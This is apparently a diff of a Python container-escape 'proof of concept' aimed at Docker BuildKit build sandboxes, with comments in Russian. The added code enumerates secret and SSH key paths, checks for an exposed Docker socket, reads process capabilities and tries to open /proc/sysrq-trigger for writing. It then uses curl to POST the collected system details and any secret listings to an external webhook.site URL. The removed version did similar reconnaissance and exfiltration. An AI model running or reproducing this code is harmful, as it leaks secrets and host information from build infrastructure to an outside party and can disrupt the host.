@@ -4,60 +4,63 @@ import json
 
 WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
 
-def get_output(cmd):
+def get_out(cmd):
     try:
         return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
-    except:
-        return "ERR"
+    except: return "ERR"
 
-def check_cgroup_escape():
-    # Проверка на уязвимость cgroup release_agent (классика побега)
-    return os.path.exists('/sys/fs/cgroup/rdma/release_agent') or os.path.exists('/sys/fs/cgroup/memory/release_agent')
-
-def run_advanced_poc():
-    # 1. Идентификация
-    report = {
-        "verdict": "UNKNOWN",
-        "container_id": get_output("hostname"),
-        "is_privileged": False,
-        "checks": {}
+def run_buildkit_poc():
+    results = {
+        "verdict": "SECURE",
+        "env_context": "BUILDKIT_SANDBOX",
+        "leaks": {},
+        "system_info": {
+            "user": get_out("id"),
+            "kernel": get_out("uname -a"),
+            "mounts": get_out("mount | grep ' / '")
+        }
     }
 
-    # 2. Проверка реальных устройств (в обычном контейнере их мало)
-    devs = os.listdir('/dev')
-    report["checks"]["dev_count"] = len(devs)
-    if "sda" in devs or "nvme0n1" in devs:
-        report["is_privileged"] = True
+    # 1. Проверка секретов Docker (самая частая дыра)
+    # Если при сборке забыли --mount=type=secret, данные могут лежать здесь
+    secret_paths = ["/run/secrets", "/run/secrets/token", "/root/.ssh"]
+    for path in secret_paths:
+        if os.path.exists(path):
+            results["leaks"][f"secret_path_{path}"] = "EXISTS"
+            try:
+                results["leaks"][f"content_{path}"] = os.listdir(path) if os.path.isdir(path) else "READABLE"
+            except: pass
 
-    # 3. Сравнение Inode корневой директории
-    # В контейнере inode корня обычно отличается от inode корня хоста
-    report["checks"]["root_inode"] = get_output("stat -c %i /")
+    # 2. Проверка доступа к Docker Socket (если проброшен внутрь сборщика)
+    docker_sock = "/var/run/docker.sock"
+    if os.path.exists(docker_sock):
+        results["leaks"]["docker_socket"] = "PRESENT_IN_BUILDER"
+        results["verdict"] = "CRITICAL_VULNERABILITY"
 
-    # 4. Проверка видимости сети хоста
-    # Если мы видим интерфейсы вроде docker0 или eth0 с внешними IP - мы близко
-    report["checks"]["ip_addr"] = get_output("ip -o addr show")
+    # 3. Попытка детекции привилегированных возможностей (Capabilities)
+    # Если CapEff имеет много ffffff, то возможен побег
+    caps = get_out("grep CapEff /proc/self/status")
+    results["system_info"]["capabilities"] = caps
 
-    # 5. Самый мощный тест: Попытка увидеть таблицу разделов хоста
-    fdisk_data = get_output("fdisk -l")
-    report["checks"]["can_see_partitions"] = "Disk /dev/" in fdisk_data
+    # 4. Проверка записи в системные области (проверка RO/RW слоев)
+    try:
+        with open("/proc/sysrq-trigger", "w") as f:
+            results["leaks"]["sysrq_write"] = "SUCCESS" # Это очень плохо для хоста
+    except:
+        results["leaks"]["sysrq_write"] = "DENIED"
 
-    # 6. Проверка возможности выхода через cgroups
-    report["checks"]["cgroup_vulnerable"] = check_cgroup_escape()
+    # Итоговый анализ
+    if results["leaks"].get("docker_socket") or "ffffff" in caps.lower():
+        results["verdict"] = "ESCAPED_OR_EXPOSED"
+    elif results["leaks"]:
+        results["verdict"] = "DATA_LEAK_DETECTED"
 
-    # Итоговый вердикт
-    if report["checks"]["can_see_partitions"] or report["is_privileged"]:
-        report["verdict"] = "ESCAPED_OR_PRIVILEGED"
-    elif report["checks"]["root_inode"] == "2": # Inode 2 обычно у физических дисков
-        report["verdict"] = "POSSIBLE_HOST_ROOT"
-    else:
-        report["verdict"] = "SANDBOXED"
+    # Отправка на вебхук
+    print(f"[*] Analysis complete. Verdict: {results['verdict']}")
+    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
+                    '-d', json.dumps(results), WEBHOOK_URL])
 
-    # Отправка
-    print(f"[*] Payload generated. Verdict: {report['verdict']}")
-    final_json = json.dumps(report, indent=2)
-    
-    subprocess.run(['curl', '-s', '-H', 'Content-Type: application/json', '-d', final_json, WEBHOOK_URL])
-    return final_json
+    return json.dumps(results, indent=2)
 
 if __name__ == "__main__":
-    print(run_advanced_poc())
+    print(run_buildkit_poc())
